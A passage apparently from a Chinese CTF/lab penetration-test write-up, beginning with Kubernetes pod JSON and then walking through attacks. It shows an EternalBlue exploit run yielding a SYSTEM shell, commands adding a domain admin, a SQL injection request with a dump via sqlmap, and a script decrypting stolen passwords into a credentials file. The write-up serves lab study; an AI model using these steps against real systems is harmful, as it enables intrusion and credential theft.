            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:20Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:23Z"
          },
          {
            "type": "ContainersReady",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:23Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:20Z"
          }
        ],
        "hostIP": "192.168.1.56",
        "podIP": "192.168.1.56",
        "podIPs": [
          {
            "ip": "192.168.1.56"
          }
        ],
        "startTime": "2026-09-24T09:55:20Z",
        "containerStatuses": [
          {
            "name": "etcd",
            "state": {
              "running": {
                "startedAt": "2026-09-24T09:55:22Z"
              }
            },
            "lastState": {
              "terminated": {
                "exitCode": 255,
                "reason": "Error",
                "startedAt": "2026-04-17T17:26:41Z",
                "finishedAt": "2026-09-24T17:54:56Z",
                "containerID": "docker://bd6a3baebedcef40afb60505307135c3fcbc18f108db1ac5b6c030b74c3d7e83"
              }
            },
            "ready": true,
            "restartCount": 9,
            "image": "registry.aliyuncs.com/google_containers/etcd:3.3.15-0",
            "imageID": "docker-pullable://registry.aliyuncs.com/google_containers/etcd@sha256:12c2c5e5731c3bcd56e6f1c05c0f9198b6f06793fa7fca2fb43aab9622dc4afa",
            "containerID": "docker://a8515437e2f81b75157b2d34cb6d7e79d99bc921511d37b70c0469a3a5d85cd3",
            "started": true
          }
        ],
        "qosClass": "BestEffort"
      }
    },
    {
      "metadata": {
        "name": "kube-apiserver-web",
        "namespace": "kube-system",
        "selfLink": "/api/v1/namespaces/kube-system/pods/kube-apiserver-web",
        "uid": "b269709cbe90ff42cbcdc86d9df1e59c",
        "creationTimestamp": null,
        "labels": {
          "component": "kube-apiserver",
          "tier": "control-plane"
        },
        "annotations": {
          "kubernetes.io/config.hash": "b269709cbe90ff42cbcdc86d9df1e59c",
          "kubernetes.io/config.seen": "2026-09-24T17:54:59.697300915Z",
          "kubernetes.io/config.source": "file"
        }
      },
      "spec": {
        "volumes": [
          {
            "name": "ca-certs",
            "hostPath": {
              "path": "/etc/ssl/certs",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "etc-ca-certificates",
            "hostPath": {
              "path": "/etc/ca-certificates",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "k8s-certs",
            "hostPath": {
              "path": "/etc/kubernetes/pki",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "usr-local-share-ca-certificates",
            "hostPath": {
              "path": "/usr/local/share/ca-certificates",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "usr-share-ca-certificates",
            "hostPath": {
              "path": "/usr/share/ca-certificates",
              "type": "DirectoryOrCreate"
            }
          }
        ],
        "containers": [
          {
            "name": "kube-apiserver",
            "image": "registry.aliyuncs.com/google_containers/kube-apiserver:v1.16.5",
            "command": [
              "kube-apiserver",
              "--advertise-address=192.168.1.56",
              "--allow-privileged=true",
              "--authorization-mode=Node,RBAC",
              "--bind-address=192.168.1.56",
              "--client-ca-file=/etc/kubernetes/pki/ca.crt",
              "--enable-admission-plugins=NodeRestriction",
              "--enable-bootstrap-token-auth=true",
              "--etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt",
              "--etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt",
              "--etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key",
              "--etcd-servers=https://127.0.0.1:2379",
              "--insecure-port=0",
              "--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt",
              "--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key",
              "--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname",
              "--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt",
              "--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key",
              "--requestheader-allowed-names=front-proxy-client",
              "--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt",
              "--requestheader-extra-headers-prefix=X-Remote-Extra-",
              "--requestheader-group-headers=X-Remote-Group",
              "--requestheader-username-headers=X-Remote-User",
              "--secure-port=6443",
              "--service-account-key-file=/etc/kubernetes/pki/sa.pub",
              "--service-cluster-ip-range=10.96.0.0/12",
              "--tls-cert-file=/etc/kubernetes/pki/apiserver.crt",
              "--tls-private-key-file=/etc/kubernetes/pki/apiserver.key"
            ],
            "resources": {
              "requests": {
                "cpu": "250m"
              }
            },
            "volumeMounts": [
              {
                "name": "ca-certs",
                "readOnly": true,
                "mountPath": "/etc/ssl/certs"
              },
              {
                "name": "etc-ca-certificates",
                "readOnly": true,
                "mountPath": "/etc/ca-certificates"
              },
              {
                "name": "k8s-certs",
                "readOnly": true,
                "mountPath": "/etc/kubernetes/pki"
              },
              {
                "name": "usr-local-share-ca-certificates",
                "readOnly": true,
                "mountPath": "/usr/local/share/ca-certificates"
              },
              {
                "name": "usr-share-ca-certificates",
                "readOnly": true,
                "mountPath": "/usr/share/ca-certificates"
              }
            ],
            "livenessProbe": {
              "httpGet": {
                "path": "/healthz",
                "port": 6443,
                "host": "192.168.1.56",
                "scheme": "HTTPS"
              },
              "initialDelaySeconds": 15,
              "timeoutSeconds": 15,
              "periodSeconds": 10,
              "successThreshold": 1,
              "failureThreshold": 8
            },
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "IfNotPresent"
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "nodeName": "web",
        "hostNetwork": true,
        "securityContext": {},
        "schedulerName": "default-scheduler",
        "tolerations": [
          {
            "operator": "Exists",
            "effect": "NoExecute"
          }
        ],
        "priorityClassName": "system-cluster-critical",
        "enableServiceLinks": true
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "Initialized",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:20Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:22Z"
          },
          {
            "type": "ContainersReady",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:22Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:20Z"
          }
        ],
        "hostIP": "192.168.1.56",
        "podIP": "192.168.1.56",
        "podIPs": [
          {
            "ip": "192.168.1.56"
          }
        ],
        "startTime": "2026-09-24T09:55:20Z",
        "containerStatuses": [
          {
            "name": "kube-apiserver",
            "state": {
              "running": {
                "startedAt": "2026-09-24T09:55:22Z"
              }
            },
            "lastState": {
              "terminated": {
                "exitCode": 255,
                "reason": "Error",
                "startedAt": "2026-04-17T17:26:41Z",
                "finishedAt": "2026-09-24T17:54:56Z",
                "containerID": "docker://91466a17b6887e674e4a083a273f9e2ea766b0d3230d3e6bd9a2f8fd72cb4267"
              }
            },
            "ready": true,
            "restartCount": 9,
            "image": "registry.aliyuncs.com/google_containers/kube-apiserver:v1.16.5",
            "imageID": "docker-pullable://registry.aliyuncs.com/google_containers/kube-apiserver@sha256:1ec8f8d41f67f3263b86d71f3a7d3d925b2458dd14292baecfbdf18c234a1855",
            "containerID": "docker://47e45ff2778a3a6cb4e8265e89b609e45fc62acbd5bee80ca33e001932ec628c",
            "started": true
          }
        ],
        "qosClass": "Burstable"
      }
    }
  ]
}
</code></pre>

组件 | namespace | pod | container
-- | -- | -- | --
etcd | kube-system | etcd-web | etcd
apiserver | kube-system | kube-apiserver-web | kube-apiserver
controller-manager | kube-system | kube-controller-manager-web | kube-controller-manager
scheduler | kube-system | kube-scheduler-web | kube-scheduler
kube-proxy | kube-system | kube-proxy-j874v | kube-proxy
flannel | kube-flannel | kube-flannel-ds-7tjnc | kube-flannel


<p>最戏剧性的一点，域管有永恒之蓝，那还需要打什么域渗透</p>
<pre><code>┌──(root㉿MJ)-[~/tools/Windows/AutoBlue-MS17-010-python3-fix]
└─# pc -q python3 zzz_exploit.py 192.168.1.83
/root/tools/Windows/AutoBlue-MS17-010-python3-fix/mysmb.py:134: SyntaxWarning: invalid escape sequence '\C'
  pipes = [ 'netlogon', 'lsarpc', 'samr', 'browser', 'spoolss', 'atsvc', 'DAV RPC SERVICE', 'epmapper', 'eventlog', 'InitShutdown', 'keysvc', 'lsass', 'LSM_API_service', 'ntsvcs', 'plugplay', 'protected_storage', 'router', 'SapiServerPipeS-1-5-5-0-70123', 'scerpc', 'srvsvc', 'tapsrv', 'trkwks', 'W32TIME_ALT', 'wkssvc','PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER', 'db2remotecmd' ]
[*] Target OS: Windows Server 2016 Standard Evaluation 14393
[+] Found pipe 'netlogon'
[+] Using named pipe: netlogon
[*] Target is 64 bit
Got frag size: 0x20
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xf90
CONNECTION: 0xffffe58a1f26fb90
SESSION: 0xffffcf8fd475a7d0
FLINK: 0xffffcf8fc8d9a098
InParam: 0xffffcf8fc8d9416c
MID: 0x2403
[+] success controlling groom transaction
[*] modify trans1 struct for arbitrary read/write
[*] make this SMB session to be SYSTEM
[*] overwriting session security context
[*] have fun with the system smb session!
[!] Dropping a semi-interactive shell (remember to escape special chars with ^)
[!] Executing interactive programs will hang shell!
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
</code></pre>
<pre><code class="language-cmd">net user mj Config123!@# /add /domain
net group "Domain Admins" mj /add /domain
</code></pre>
<p>复现的时候把DC打蓝屏了，懒得重置环境了，思路就是加个域管就行</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc -q dirb http://192.168.1.123:8000                                                                     
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Sep 24 18:51:10 2026
URL_BASE: http://192.168.1.123:8000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.1.123:8000/ ----
+ http://192.168.1.123:8000/docs (CODE:200|SIZE:1497)
</code></pre>
<p>8000端口模糊查询，是有sql注入的，我拉了所有hash但是跑不出来一个，本来以为要ssh上去，结果flag就在数据库</p>
<pre><code>POST /api/PasswdHash HTTP/1.1
Host: 192.168.1.123:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 27

{"username":"1' or 1=1--+"}
</code></pre>
<p>有注入直接sqlmap秒了就行</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc -q sqlmap -r bp.txt --dbms=sqlite --dump --batch --purge
</code></pre>
<p>要指定数据库sqlite不然跑不出来，不过把level拉高应该不用指定，但是太慢</p>
<pre><code>+----+---------------------------------------------+----------------------+
| id | flag                                        | hint                 |
+----+---------------------------------------------+----------------------+
| 1  | flag2{9f23aa16-33e7-11f1-9508-7e92a294591d} | Can you decrypt AES? |
+----+---------------------------------------------+----------------------+
</code></pre>
<p>而且有个hint，解密hash，这个应该是预期，解密之后cme撞密码</p>
<pre><code class="language-python">#!/usr/bin/env python3
import hashlib
import csv
from Crypto.Cipher import AES

LOGIN = "/root/.local/share/sqlmap/output/192.168.1.123/dump/SQLite_masterdb/login.csv"
INFO  = "/root/.local/share/sqlmap/output/192.168.1.123/dump/SQLite_masterdb/informations.csv"

def load_login():
    """读 login.csv: username, hash(md5), passwd(aes密文)"""
    out = {}
    with open(LOGIN, newline='', encoding='utf-8') as f:
        for row in csv.DictReader(f):
            u  = row['username']
            h  = row['hash']
            c  = row['passwd']
            out[u] = (h, c)
    return out

def load_keys():
    """读 informations.csv: username, key"""
    out = {}
    with open(INFO, newline='', encoding='utf-8') as f:
        for row in csv.DictReader(f):
            out[row['username']] = row['key']
    return out

def decrypt_candidates(key_str, ct_hex):
    key = key_str.encode()
    try:
        ct = bytes.fromhex(ct_hex)
    except Exception:
        return
    if len(key) not in (16, 24, 32) or len(ct) % 16:
        return

    modes = [
        ("ECB",       AES.new(key, AES.MODE_ECB)),
        ("CBC-iv0",   AES.new(key, AES.MODE_CBC, iv=b'\x00'*16)),
        ("CBC-ivkey", AES.new(key, AES.MODE_CBC, iv=key[:16])),
    ]
    for mode, cipher in modes:
        pt = cipher.decrypt(ct)
        # 尝试 1: 去掉尾部 \x00
        try:
            text = pt.rstrip(b'\x00').decode('utf-8')
            yield mode + "+rstrip0", text
        except Exception:
            pass
        # 尝试 2: 去 PKCS7 padding
        try:
            n = pt[-1]
            if 1 &#x3C;= n &#x3C;= 16:
                text = pt[:-n].decode('utf-8')
                yield mode + "+unpad", text
        except Exception:
            pass
        # 尝试 3: 原始（可能本身就是明文，没有 padding）
        try:
            text = pt.decode('utf-8')
            yield mode + "+raw", text
        except Exception:
            pass

def main():
    login = load_login()
    keys  = load_keys()
    print(f"[+] login: {len(login)}, keys: {len(keys)}")

    matches = []
    for user, (md5_hash, ct_hex) in sorted(login.items()):
        key = keys.get(user)
        if not key:
            print(f"[-] {user}: 无 key")
            continue

        hit = False
        for mode, text in decrypt_candidates(key, ct_hex):
            # 校验1: MD5(text) == hash
            if hashlib.md5(text.encode()).hexdigest() == md5_hash:
                print(f"[+] {user}:{text}   ({mode})")
                matches.append((user, text))
                hit = True
                break
            # 校验2: text 本身就是 hash 的二进制/hex（备用）
            if text == md5_hash:
                print(f"[?] {user} 解出等于 hash: {text!r}  ({mode})")
        if not hit:
            print(f"[-] {user}: 未命中")

    with open('creds.txt', 'w') as f:
        for u, p in matches:
            f.write(f"{u}:{p}\n")
    print(f"\n[+] Saved {len(matches)} to creds.txt")

if __name__ == '__main__':
    main()
</code></pre><!--EndFragment-->
</body>
</html>